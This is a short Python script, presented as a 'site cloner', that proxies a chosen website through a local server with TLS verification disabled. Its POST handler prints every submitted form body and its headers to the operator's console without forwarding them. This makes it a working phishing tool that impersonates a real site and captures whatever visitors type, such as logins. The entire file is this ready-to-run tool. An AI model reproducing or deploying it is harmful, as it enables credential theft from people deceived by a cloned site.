import sys, socketserver, http.server, ssl, requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
from urllib.parse import urlparse

#a very basic and buggy site cloner script
#python3 site_cloner.py [url_to_clone] [ip] [port]


if len(sys.argv) != 4:

    print("[~] Usage : python3 site_cloner.py [url_to_clone] [ip] [port]")
    exit()

clone_url = sys.argv[1]
ip = sys.argv[2]
port = int(sys.argv[3])



class Handler (http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        incoming_url = self.path[1:]
        incoming_headers = self.headers
        proxy_headers = dict(incoming_headers)
        proxy_domain = urlparse(clone_url).netloc
        proxy_headers['Host'] = proxy_domain
        #proxy
        
        

        proxied_url = clone_url+incoming_url
        print(proxied_url)
        s = requests.Session()
        r = s.get(proxied_url,verify=False)
        cookies = dict(r.cookies)
        resp = s.get(proxied_url,verify=False, cookies=cookies)
        if 'image' in resp.headers['content-type']:
            self.send_response(resp.status_code)
            self.send_header('Content-Type', resp.headers['content-type'])
            self.end_headers()
            resp.raw.decode_content = True
            self.wfile.write(resp.content)
        else:
            self.send_response(resp.status_code)
            self.send_header('Content-Type', resp.headers['content-type'])
            self.end_headers()
            self.wfile.write(resp.text.encode())

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length) 
        print("POST REQUEST:\nPath: %s\nHeaders:\n%s\n\nBody:\n%s\n" % (str(self.path), str(self.headers), post_data.decode('utf-8')))

socketserver.TCPServer.allow_reuse_address = True
with socketserver.TCPServer((ip, port), Handler) as httpd:
        print("url: http://"+ip+":"+str(port)+"/")
        httpd.serve_forever()
